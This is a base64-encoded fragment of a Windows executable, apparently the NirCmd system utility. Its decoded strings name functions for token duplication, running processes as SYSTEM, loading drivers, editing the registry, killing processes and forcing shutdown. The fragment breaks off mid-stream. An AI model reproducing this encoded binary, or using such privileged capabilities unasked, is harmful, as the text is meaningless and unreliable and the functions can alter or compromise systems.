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
s0jEHYJrEUSfxVju2Kxdcpm0ULupbaFClNPIaBIxFY+feTi2mGVWTLPtUJyj81si
XxwSQ6sIjk2wlmBifVarJ2ZtQYntojBOpqjqXoQoA0pJQSBOKDgpSomQo5WY0r1t
JMx+G1DsQkaiEiDxLgJ4b2JjDTzHzeZOsw5qBl07A2cyYXzlOfArT5L2/lcWgi6J
ntpQnoaD+EqtE7hIuXInr5L8A/EpChRIv0SHXYBcYCwxKTQWSeVXSIV1dd43UXpu
0J7pMdhqG0OuPGUtnox4MjvR/U0oenhGn+xkSDou3D8/0oPdtGZ3SqZdxmPe1FAX
awXSydzZQUKRNH9D1+4IJr3oc8C3ACBMma/ara3Kzavlxk8mviaKQpGFH7ba0ZKM
8CkvwMrfwU2LgO0yFuG14BfdEi1ObG5FqVPSEOPGQXaS+yobXgswSrXMNT20+eFQ
JPnT8/wR0xG7lwDAT47mwAyUb0z+PNIRnucAwE95c5bzEK3Wq3DhQZazTDbjXTM8
ZGpi3ITWJ0aDy0RCCr29GqGQGKsf6dIRu5EAwE+O5sB6W1ynUBxSTrohGXpFebAk
3jUcc5rj5ECxEJSPkVEKhcuCGHig2ZxHkBtiwznwgQqQIG3T803US6IvDZGXX3lk
QOranNOnxUyu0LXjWtDxaQJREIoF3clMtgM2JkeNv6H5+e58Ez3SEZ7nAMBPeXOW
rtsaw39S9U+iMPYrth/3DG2S3E3nbMBNmaevnmtqTpHuFAIAAAAAAMAAAAAAAABG
QDvy+/DjGxCEiACqAD5W+IA78vvw4xsQhIgAqgA+VvgBFAIAAAAAAMAAAAAAAABG
CwEAAAAAAADAAAAAAAAARk5pckNtZAAATVMgU2FucyBTZXJpZgAAAAAAAAAAAAAA
TmlyQ21kIHYyLjgzDQpDb3B5cmlnaHQgKGMpIDIwMDMgLSAyMDE5IE5pciBTb2Zl
cg0KDQpGb3IgbW9yZSBpbmZvcm1hdGlvbiBhYm91dCB1c2luZyB0aGlzIHV0aWxp
dHksIHJlYWQgdGhlIGhlbHAgZmlsZSAtIG5pcmNtZC5jaG0NCgAAAGh0dHA6Ly93
d3cubmlyc29mdC5uZXQAAG9wZW4AAAAAAAAAAAAAAABJZiB5b3UgY29weSBOaXJD
bWQgdXRpbGl0eSBpbnRvIHlvdXIgV2luZG93cyBkaXJlY3RvcnksIHlvdSdsbCBi
ZSBhYmxlIHRvIHVzZSBOaXJDbWQgd2l0aG91dCBzcGVjaWZ5aW5nIHRoZSBmdWxs
IHBhdGggb2YgbmlyY21kLmV4ZQ0KDQpEbyB5b3Ugd2FudCB0byBjb3B5IE5pckNt
ZCBpbnRvIHlvdXIgV2luZG93cyBkaXJlY3RvcnkgPwBuaXJjbWQuZXhlAABFcnJv
cgAAAAAAAABGYWlsZWQgdG8gY29weSBOaXJDbWQgIQBhZHZhcGkzMi5kbGwAAAAA
Q3JlYXRlUHJvY2Vzc1dpdGhUb2tlblcAT3BlblByb2Nlc3NUb2tlbgAAAAAAAAAA
RHVwbGljYXRlVG9rZW5FeAAAAAAAAAAAQ3JlYXRlUHJvY2Vzc0FzVXNlckEAAAAA
V3RzYXBpMzIuZGxsAAAAAFdUU1F1ZXJ5VXNlclRva2VuAAAAAAAAAFdUU0dldEFj
dGl2ZUNvbnNvbGVTZXNzaW9uSWQAAAAAa2VybmVsMzIuZGxsAAAAAHQWAEABAAAA
eBYAQAEAAABAFgBAAQAAAHwWAEABAAAAeB0AQAEAAABAFgBAAQAAAMQWAEABAAAA
vB0AQAEAAAB0FgBAAQAAAHgWAEABAAAAbXNjb3JlZS5kbGwAAAAAAExvYWRMaWJy
YXJ5U2hpbQBmAHUAcwBpAG8AbgAuAGQAbABsAAAAAABDcmVhdGVBc3NlbWJseUNh
Y2hlAAAAAABHRElQbHVzLmRsbAAAAAAAR2RpcGx1c1N0YXJ0dXAAAEdkaXBsdXNT
aHV0ZG93bgBHZGlwU2F2ZUltYWdlVG9GaWxlAAAAAABHZGlwR2V0SW1hZ2VFbmNv
ZGVyc1NpemUAAAAAAAAAAEdkaXBHZXRJbWFnZUVuY29kZXJzAAAAAEdkaXBDcmVh
dGVCaXRtYXBGcm9tSEJJVE1BUAAAAAAAR2RpcERpc3Bvc2VJbWFnZQAAAAAAAAAA
R2RpcExvYWRJbWFnZUZyb21GaWxlAAAAR2RpcENyZWF0ZUhCSVRNQVBGcm9tQml0
bWFwAAAAAABHZGlwQ3JlYXRlQml0bWFwRnJvbUZpbGUAAAAAAAAAAGkAbQBhAGcA
ZQAvAHAAbgBnAAAAAAAAAC4AZwBpAGYAAAAAAAAAAABpAG0AYQBnAGUALwBnAGkA
ZgAAAAAAAAAuAGoAcABnAAAAAAAAAAAALgBqAHAAZQBnAAAAAAAAAGkAbQBhAGcA
ZQAvAGoAcABlAGcAAAAAAC4AdABpAGYAZgAAAAAAAAAuAHQAaQBmAAAAAAAAAAAA
aQBtAGEAZwBlAC8AdABpAGYAZgAAAAAALgBiAG0AcAAAAAAAAAAAAGkAbQBhAGcA
ZQAvAGIAbQBwAAAAAAAAAG5ldG1zZy5kbGwAAAAAAABVbmtub3duIEVycm9yAAAA
XAAAAAAAAABFcnJvciAlZDogJXMAAAAAPD46Ii9cfAAuAAAALi4AACU4LjhYIAAA
JTIuMlggAAANCgAAeWVzAG5vAABvawAAY2FuY2VsAAByZXRyeQAAAGlnbm9yZQAA
Y2xvc2UAAABoZWxwAAAAAP/+AAANAAoAAAAAAAAAAABJc1dvdzY0UHJvY2VzcwAA
a2VybmVsMzIAAAAAAAAAAHVzZXIzMi5kbGwAAAAAAABTZXRMYXllcmVkV2luZG93
QXR0cmlidXRlcwAALmxuawAAAAAAAAAAXC86Kj8iPD58AAAALnVybAAAAAAAAAAA
Q2hhbmdlRGlzcGxheVNldHRpbmdzRXhBAAAAAAAAAABQcmltYXJ5AFxcLlxESVNQ
TEFZJXMAAABOJVykHN/9ToAgZ9FGqFDgAgAAAAAAAABuUW4CFLhLQYPNhW1v70gi
AgAAAAAAAAB3k3SWkTPSEZ7jAMBPeXOWdN9EbLlykkmh7O+ZbgQi1EZsYXNoV2lu
ZG93RXgAAAA4a0h6OEJpdE1vbm8AAAAAOGtIejhCaXRTdGVyZW8AADhrSHoxNkJp
dE1vbm8AAAA4a0h6MTZCaXRTdGVyZW8AMTFrSHo4Qml0TW9ubwAAADExa0h6OEJp
dFN0ZXJlbwAxMWtIejE2Qml0TW9ubwAAMTFrSHoxNkJpdFN0ZXJlbwAAAAAAAAAA
MTJrSHo4Qml0TW9ubwAAADEya0h6OEJpdFN0ZXJlbwAxMmtIejE2Qml0TW9ubwAA
MTJrSHoxNkJpdFN0ZXJlbwAAAAAAAAAAMTZrSHo4Qml0TW9ubwAAADE2a0h6OEJp
dFN0ZXJlbwAxNmtIejE2Qml0TW9ubwAAMTZrSHoxNkJpdFN0ZXJlbwAAAAAAAAAA
MjJrSHo4Qml0TW9ubwAAADIya0h6OEJpdFN0ZXJlbwAyMmtIejE2Qml0TW9ubwAA
MjJrSHoxNkJpdFN0ZXJlbwAAAAAAAAAAMjRrSHo4Qml0TW9ubwAAADI0a0h6OEJp
dFN0ZXJlbwAyNGtIejE2Qml0TW9ubwAAMjRrSHoxNkJpdFN0ZXJlbwAAAAAAAAAA
MzJrSHo4Qml0TW9ubwAAADMya0h6OEJpdFN0ZXJlbwAzMmtIejE2Qml0TW9ubwAA
MzJrSHoxNkJpdFN0ZXJlbwAAAAAAAAAANDRrSHo4Qml0TW9ubwAAADQ0a0h6OEJp
dFN0ZXJlbwA0NGtIejE2Qml0TW9ubwAANDRrSHoxNkJpdFN0ZXJlbwAAAAAAAAAA
NDhrSHo4Qml0TW9ubwAAADQ4a0h6OEJpdFN0ZXJlbwA0OGtIejE2Qml0TW9ubwAA
NDhrSHoxNkJpdFN0ZXJlbwAAAAAAAAAAVHJ1ZVNwZWVjaF84a0h6MUJpdE1vbm8A
Q0NJVFRfQUxhd184a0h6TW9ubwAAAAAAQ0NJVFRfQUxhd184a0h6U3RlcmVvAAAA
Q0NJVFRfQUxhd18xMWtIek1vbm8AAAAAQ0NJVFRfQUxhd18xMWtIelN0ZXJlbwAA
Q0NJVFRfQUxhd18yMmtIek1vbm8AAAAAQ0NJVFRfQUxhd18yMmtIelN0ZXJlbwAA
Q0NJVFRfQUxhd180NGtIek1vbm8AAAAAQ0NJVFRfQUxhd180NGtIelN0ZXJlbwAA
Q0NJVFRfdUxhd184a0h6TW9ubwAAAAAAQ0NJVFRfdUxhd184a0h6U3RlcmVvAAAA
Q0NJVFRfdUxhd18xMWtIek1vbm8AAAAAQ0NJVFRfdUxhd18xMWtIelN0ZXJlbwAA
Q0NJVFRfdUxhd18yMmtIek1vbm8AAAAAQ0NJVFRfdUxhd18yMmtIelN0ZXJlbwAA
Q0NJVFRfdUxhd180NGtIek1vbm8AAAAAQ0NJVFRfdUxhd180NGtIelN0ZXJlbwAA
QURQQ01fOGtIek1vbm8AAEFEUENNXzhrSHpTdGVyZW8AAAAAAAAAAEFEUENNXzEx
a0h6TW9ubwBBRFBDTV8xMWtIelN0ZXJlbwAAAAAAAABBRFBDTV8yMmtIek1vbm8A
QURQQ01fMjJrSHpTdGVyZW8AAAAAAAAAQURQQ01fNDRrSHpNb25vAEFEUENNXzQ0
a0h6U3RlcmVvAAAAAAAAAEdTTTYxMF84a0h6TW9ubwBHU002MTBfMTFrSHpNb25v
AAAAAAAAAABHU002MTBfMjJrSHpNb25vAAAAAAAAAABHU002MTBfNDRrSHpNb25v
AAAAAAAAAABAHwAAESsAAOAuAACAPgAAIlYAAMBdAAAAfQAARKwAAIC7AAAAAAAA
QB8AABErAAAiVgAARKwAAAAQAAAAIAAADBYAABksAACTKwAAJ1cAAKNWAABHrQAA
AAEAAAABAAAAAgAAAAQAAPQBBwAAAQAAAAIA/wAAAADAAEAA8AAAAMwBMP+IARj/
9AMHAAABAAAAAgD/AAAAAMAAQADwAAAAzAEw/4gBGP/0BwcAAAEAAAACAP8AAAAA
wABAAPAAAADMATD/iAEY/1kGAAC/CAAAfhEAAP0iAABVc2VyZW52LmRsbAAAAAAA
Q3JlYXRlRW52aXJvbm1lbnRCbG9jawAAQ3JlYXRlUHJvY2Vzc1dpdGhMb2dvblcA
RXhwbG9yZXIuZXhlAAAAAFNoZWxsX1RyYXlXbmQAAABQcm9nbWFuAFNldENvbnNv
bGVEaXNwbGF5TW9kZQAAAEVudW1EaXNwbGF5RGV2aWNlc0EAbWFzdGVyAAAAAAAA
d2F2ZW91dABzeW50aAAAAGNkAAAAAAAAbWljcm9waG9uZQAAcGhvbmUAAABhdXgA
bGluZQAAAABoZWFkcGhvbmVzAAB3YXZlaW4AAGFsdABjdHJsAAAAAHNoaWZ0AAAA
ZXh0AHBsdXMAAAAAc3BjAGVudGVyAAAAdGFiAGVzYwBpbnMAZGVsAERsbFJlZ2lz
dGVyU2VydmVyAAAAAAAAAERsbFVucmVnaXN0ZXJTZXJ2ZXIAAAAAAE5pckNtZFdp
bkNscwAAAABmb2xkZXIuAGxvb3Bjb3VudAAAAAAAAABjdXJyZGF0ZS4AAAAAAAAA
Y3VycnRpbWUuAAAAc3lzLgAAAABuaXIuAAAAAHBhcmFtLgAAAAAAAGZwYXJhbS4A
Y2xpcGJvYXJkAAAAAAAAAE5pckNvbUxpbmUAAG5vdwBleGVmaWxlAHN5c3RlbQAA
d2luZG93cwBuaXJjbWQAAGNvbW1vbl9kZXNrdG9wAABjb21tb25fc3RhcnRfbWVu
dQAAAAAAAABjb21tb25fcHJvZ3JhbXMAZGVza3RvcABzdGFydF9tZW51AAAAAAAA
cHJvZ3JhbXMAAAAAAAAAAHN0YXJ0dXAAYXBwZGF0YQBjb29raWVzAGZhdm9yaXRl
cwAAAHJlY2VudAAAAAAAAGNvbW1vbl9zdGFydHVwAABjb21tb25fZmF2b3JpdGVz
AAAAAAAAAABwcm9ncmFtZmlsZXMAAAAAY29tbW9uX3Byb2dyYW1maWxlcwAAAAAA
bXlkb2N1bWVudHMAbm9ybWFsAABsb3cAYmVsb3dub3JtYWwAAAAAAGFib3Zlbm9y
bWFsAGhpZ2gAAAAAAAAAAHJlYWx0aW1lAAAAAAAAAABTZVRjYlByaXZpbGVnZQAA
U2VEZWJ1Z1ByaXZpbGVnZQAAAABub2hleAAAAAAAAABub2FzY2lpAGJpbgAAAAAA
Q2Fubm90IGZpbmQgdGhlIHNwZWNpZmllZCBwcm9jZXNzICEAAAAAAEZhaWxlZCB0
byBsb2FkIHRoZSBwcm9jZXNzIGxpYnJhcnkgIQAAAABsZWZ0c2hpZnQAAAAAAAAA
cmlnaHRzaGlmdAAAAAAAAGxlZnRjdHJsAAAAAAAAAAByaWdodGN0cmwAAAAAAAAA
bGVmdG1lbnUAAAAAAAAAAHJpZ2h0bWVudQAAAGRvd24AAAAAdXAAAGxlZnQAAAAA
cmlnaHQAAABob21lAAAAAGVuZABpbnNlcnQAAGRlbGV0ZQAAY29tbWEAAABtaW51
cwAAAHBlcmlvZAAAbHdpbgAAAAByd2luAAAAAGFwcHMAAAAAcGFnZXVwAAAAAAAA
cGFnZWRvd24AAAAAAAAAAG11bHRpcGx5AAAAAGFkZABzdWJ0cmFjdAAAAAAAAAAA
c2VwZXJhdG9yAAAAZGl2aWRlAAAAAAAAYmFja3NwYWNlAAAAcGF1c2UAAAAAAAAA
Y2Fwc2xvY2sAAAAAAAAAAG51bWxvY2sAc2Nyb2xsAABwcmludHNjcmVlbgAjMzI3
NzAAAGNsaWNrAAAAAAAAAHNldHRleHQAc2hvdwAAAABzaG93bmEAAGhpZGUAAAAA
aGlkZXNob3cAAAAAZmxhc2gAAABtYXgAbWluAAAAAABzZXR0b3Btb3N0AABmb2N1
cwAAAAAAAABhY3RpdmF0ZQAAAABlbmFibGUAAAAAAABkaXNhYmxlAHRvZ2dsZWRp
c2FibGUAAAB0b2dnbGVoaWRlAAAAAAAAdG9nZ2xlbWluAAAAAAAAAHRvZ2dsZW1h
eAAAAHJlZHJhdwAAAAAAAHNldHNpemUAc2VuZG1zZwBwb3N0bXNnAGNlbnRlcgAA
Y2hpbGQAAABtb3ZlAAAAAGRsZ2NsaWNrAAAAAAAAAABkbGdzZXR0ZXh0AAAAAAAA
ZGxnc2V0Zm9jdXMAK3N0eWxlAAAtc3R5bGUAAAAAAAArZXhzdHlsZQAAAAAAAAAA
LWV4c3R5bGUAAAAAdHJhbnMAAAB0aXRsZQAAAHN0aXRsZQAAaXRpdGxlAABldGl0
bGUAAGlkAABjbGFzcwAAAHByb2Nlc3MAYWxsdG9wAABhbGx0b3Bub2Rlc2t0b3AA
cHJvZ21hbgBzaGVsbF90cmF5d25kAAAAYnV0dG9uAABhbGwAAAAAAEZhaWxlZCB0
byBjcmVhdGUgdGhlIHNob3J0Y3V0ICEAbmlyY21kLmV4ZSAlcwAAAGFkbWluJFxu
aXJjbWQuZXhlAAAAXFwAAGMAAAAAAAAAZm9jdXNlZABzeXN0ZW1zb3VuZHMAAAAA
U291bmQgRGV2aWNlcwAAAGRlZmF1bHRfcmVjb3JkAABzaG93ZXJyb3IAAAAAAAAA
cGFyYW1zZmlsZQAAAAAAAGNtZHdhaXQAbG9vcAAAAAByZW1vdGUAAGNvcHkAAAAA
bXVsdGlyZW1vdGUAAAAAAHFib3hjb20AcWJveGNvbXRvcAAAAAAAAGluZm9ib3gA
cWJveAAAAABxYm94dG9wAGV4ZWMyAAAAZXhlYwAAAABleGVjbWQAAGNtZC5leGUA
Y29tbWFuZC5jb20AAAAAACVzIC9jICVzAAAAAAAAAAByZWdzZXR2YWwAAAAAAAAA
VGhlIHNwZWNpZmllZCBrZXkgaXMgbm90IHZhbGlkICEAAAAAU1oAAEVYUEFORF9T
WgAAAERXT1JEAAAAQklOQVJZAAAAAAAAcmVnZGVsdmFsAAAAAAAAAHJlZ2RlbGtl
eQAAAAAAAAAAAAAAAAAAAENhbm5vdCBkZWxldGUgdGhlIGtleSwgYmVjYXVzZSBp
dCBjb250YWlucyBvbmUgb3IgbW9yZSBzdWJrZXlzLgByZWdlZGl0AGluaXNldHZh
bAAAAAAAAABpbmlkZWx2YWwAAAAAAAAAaW5pZGVsc2VjAAAAAAAAAHJhc2RpYWxk
bGcAAAAAAABpbmV0ZGlhbAAAAAAAAAAAVGhlIGRpYWxpbmcgZnVuY3Rpb24gaXMg
bm90IGF2YWlsYWJsZSBpbiB5b3VyIHN5c3RlbSAhAAByYXNkaWFsAFVuYWJsZSB0
byByZWNlaXZlIGRpYWx1cCBpbmZvcm1hdGlvbiBvZiB0aGUgc3BlY2lmaWVkIGVu
dHJ5ICEAAABtb3ZlcmVjeWNsZWJpbgAAZW1wdHliaW4AAAAAAAAAAHJhc2hhbmd1
cAAAAAAAAABGYWlsZWQgdG8gaHVuZyB1cCB0aGlzIFJBUyBpdGVtAENhbm5vdCBm
aW5kIHRoZSBzcGVjaWZpZWQgY29ubmVjdGlvbiBuYW1lICEAAAAAAGV4aXR3aW4A
bG9nb2ZmAABwb3dlcm9mZgAAAAByZWJvb3QAAAAAAABzaHV0ZG93bgAAAABmb3Jj
ZQAAAAAAAABmb3JjZWlmaHVuZwAAAAAAYWJvcnRzaHV0ZG93bgAAAGluaXRzaHV0
ZG93bgAAAABjbWRzaG9ydGN1dAAAAAAAY21kc2hvcnRjdXRrZXkAAHNob3J0Y3V0
AAAAAHNoZXhlYwAAAAAAAEZhaWxlZCB0byBleGVjdXRlIHRoaXMgZmlsZSAhAAAA
Y2xvbmVmaWxldGltZQAAAHNldGZpbGV0aW1lAAAAAABzZXRmaWxlZm9sZGVydGlt
ZQAAAAAAAABzZXRjb25zb2xlbW9kZQAAY29uc29sZXdyaXRlAAAAAHNldGNvbnNv
bGVjb2xvcgBkZWJ1Z3dyaXRlAAAAAAAAc2V0Y3Vyc29yAAAAAAAAAHNldGN1cnNv
cndpbgAAAAByZXN0YXJ0ZXhwbG9yZXIAc2VuZGtleXByZXNzAAAAACsAAAAAAAAA
c2VuZGtleQBwcmVzcwAAAHNlbmRtb3VzZQAAAHdoZWVsAAAAAAAAAGRibGNsaWNr
AAAAAAAAAABtb3ZlY3Vyc29yAAAAAAAAY2hhbmdlYnJpZ2h0bmVzcwAAAAAAAAAA
XFwuXExDRABzZXRicmlnaHRuZXNzAAAAc2V0cHJpbWFyeWRpc3BsYXkAAAAAAAAA
c2V0ZGlzcGxheQAAAAAAAG1vbml0b3I6AAAAAAAAAAAtdXBkYXRlcmVnAAAAAAAA
LWFsbHVzZXJzAAAAAAAAAEZhaWxlZCB0byBjaGFuZ2UgdGhlIGRpc3BsYXkgc2V0
dGluZyAhAABJbnZhbGlkIGRpc3BsYXkgdmFsdWVzICEAAAAAAAAAAGNsb3NlcHJv
Y2VzcwAAAABGYWlsZWQgdG8gY2xvc2UgdGhlIHNwZWNpZmllZCBwcm9jZXNzICEA
a2lsbHByb2Nlc3MAAAAAAEZhaWxlZCB0byBraWxsIHRoZSBzcGVjaWZpZWQgcHJv
Y2VzcyAhAABtZW1kdW1wAHNlcnZpY2UAVW5hYmxlIHRvIGxvYWQgdGhlIHNlcnZp
Y2VzIGxpYnJhcnkgIQAAAHN0b3AAAAAAY29udGludWUAAAAAc3RhcnQAAAAAAAAA
cmVzdGFydABhdXRvAAAAAG1hbnVhbAAAZGlzYWJsZWQAAAAAYm9vdAAAAAB3aW4A
aGFuZGxlAABhY3RpdmUAAGZvcmVncm91bmQAAGxvY2t3cwAAY2xlYXIAAABzZXQA
ZmlsZQAAAAByZWFkZmlsZQAAAAAAAAAAd3JpdGVmaWxlAAAAAAAAAHdyaXRldWZp
bGUAAAAAAABhZGRmaWxlAGFkZHVmaWxlAAAAAAAAAABjb3B5aW1hZ2UAAAAAAAAA
c2F2ZWltYWdlAAAAAAAAAGxvYWRjbHAAc2F2ZWNscABzZXRkaWFsdXBsb2dvbgAA
RmFpbGVkIHRvIHNldCB0aGUgbG9nb24gZGV0YWlscyBmb3IgdGhpcyBkaWFsdXAg
aXRlbSAhAABzY3JpcHQAAG1lZGlhcGxheQAAAAAAAABvcGVuICIlcyIgdHlwZSBt
cGVndmlkZW8gYWxpYXMgJXMAAAAAAAAAcGxheSAlcwBjbG9zZSAlcwAAAAAAAAAA
dXJsc2hvcnRjdXQAJWZhdiUAAAAAAAAARmFpbGVkIHRvIGNyZWF0ZSB0aGUgaW50
ZXJuZXQgc2hvcnRjdXQgIQAAAAAAAAAAbW9uaXRvcgBvZmYAb24AAGFzeW5jX29m
ZgAAAAAAAABhc3luY19vbgAAAAAAAAAAYXN5bmNfbG93AAAAAAAAAHNjcmVlbnNh
dmVyAAAAAABzY3JlZW5zYXZlcnRpbWVvdXQAAAAAAABydW5hc3N5c3RlbQAAAAAA
d2lubG9nb24uZXhlAAAAAHJ1bmludGVyYWN0aXZlAABydW5pbnRlcmFjdGl2ZWNt
ZAAAAAAAAAAiJXMiICVzAGVsZXZhdGUAUnVuQXMAAABlbGV2YXRlY21kAABydW5h
cwAAAAAAAABzdGFuZGJ5AGhpYmVybmF0ZQAAAAAAAABjb21wbmFtZQAAAABjZHJv
bQAAAE9wZW4AAAAAQ2xvc2VkAABjZDEAU2V0ICVzIERvb3IgJXMAAG9wZW4gJXMg
dHlwZSBjZGF1ZGlvIGFsaWFzICVzAAAAYmVlcAAAAAB3YWl0AAAAAHN1c3BlbmRw
cm9jZXNzAAByZXN1bWVwcm9jZXNzAAAAc2V0cHJvY2Vzc3ByaW9yaXR5AAAAAAAA
c2V0cHJvY2Vzc2FmZmluaXR5AAAAAAAAd2FpdHByb2Nlc3MAAAAAAHNldHZvbHVt
ZQAAAAAAAABjaGFuZ2V2b2x1bWUAAAAAc2V0c3lzdm9sdW1lAAAAAGNoYW5nZXN5
c3ZvbHVtZQBzZXRzeXN2b2x1bWUyAAAAY2hhbmdlc3lzdm9sdW1lMgAAAAAAAAAA
bXV0ZXN5c3ZvbHVtZQAAAHNldGFwcHZvbHVtZQAAAABjaGFuZ2VhcHB2b2x1bWUA
bXV0ZWFwcHZvbHVtZQAAAG11dGVzdWJ1bml0dm9sdW1lAAAAAAAAAHNldHN1YnVu
aXR2b2x1bWVkYgAAAAAAAHNldGRlZmF1bHRzb3VuZGRldmljZQAAAHNob3dzb3Vu
ZGRldmljZXMAAAAAcmVnc3ZyAAB1bnJlZwAAAAAAAAAlczogU3VjY2VlZA0KAAAA
JXM6IEZhaWxlZCB0byBsb2FkIHRoZSBsaWJyYXJ5DQoAAAAAAAAAACVzOiBGYWls
ZWQgdG8gbG9hZCB0aGUgcmVnaXN0cmF0aW9uIGZ1bmN0aW9uDQoAAGdhYwAAAAAA
aW5zdGFsbABGYWlsZWQgdGhlIGluc3RhbGwgdGhlIHNwZWNpZmllZCBhc3NlbWJs
eQAAAAAAAABzaGVsbHJlZnJlc2gAAAAAY29udmVydGltYWdlcwAAAGNvbnZlcnRp
bWFnZQAAAABkZXNrcmVmcmVzaAAAAAAAU2hlbGwgSWNvbiBCUFAAAENvbnRyb2wg
UGFuZWxcRGVza3RvcFxXaW5kb3dNZXRyaWNzAAAAAABzeXNyZWZyZXNoZm9udAAA
c3lzcmVmcmVzaGNvbG9yAHN5c3JlZnJlc2gAAAAAAABzdGRiZWVwAHJldHVybnZh
bAAAAGRsZwBzcGVhawAAAHhtbABkbGdhbnkAAAAAAABzaGVsbGNvcHkAAAAAAAAA
eWVzdG9hbGwAAAAAAAAAAG5vZXJyb3J1aQAAAHNpbGVudAAAAAAAAG5vc2VjYXR0
cgAAAAAAAABzYXZlc2NyZWVuc2hvdAAAc2F2ZXNjcmVlbnNob3RmdWxsAAAAAAAA
KmNsaXBib2FyZCoAAAAAAHNhdmVzY3JlZW5zaG90d2luAAAAAAAAAGZpbGxkZWxl
dGUAAHJlbQB0cmF5YmFsbG9vbgAAAAAAaHR0cDovL25pcmNtZC5uaXJzb2Z0Lm5l
dC8lcy5odG1sAAAAAAAAAGh0dHA6Ly9uaXJjbWQubmlyc29mdC5uZXQAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAKnM4xIYdcVEpee6WnnLkp5udGRsbC5kbGwAAAAAAAAA
TnRRdWVyeVN5c3RlbUluZm9ybWF0aW9uAAAAAAAAAABOdExvYWREcml2ZXIAAAAA
TnRVbmxvYWREcml2ZXIAAE50T3BlblN5bWJvbGljTGlua09iamVjdAAAAAAAAAAA
TnRRdWVyeVN5bWJvbGljTGlua09iamVjdAAAAAAAAABOdFF1ZXJ5T2JqZWN0AAAA
TnRTdXNwZW5kUHJvY2VzcwAAAAAAAAAATnRSZXN1bWVQcm9jZXNzAExvb2t1cFBy
aXZpbGVnZVZhbHVlQQAAAEFkanVzdFRva2VuUHJpdmlsZWdlcwAAAFNlU2h1dGRv
d25Qcml2aWxlZ2UAAAAAAEluaXRpYXRlU3lzdGVtU2h1dGRvd25BAEFib3J0U3lz
dGVtU2h1dGRvd25BAAAAAExvY2tXb3JrU3RhdGlvbgBTZXRTeXN0ZW1Qb3dlclN0
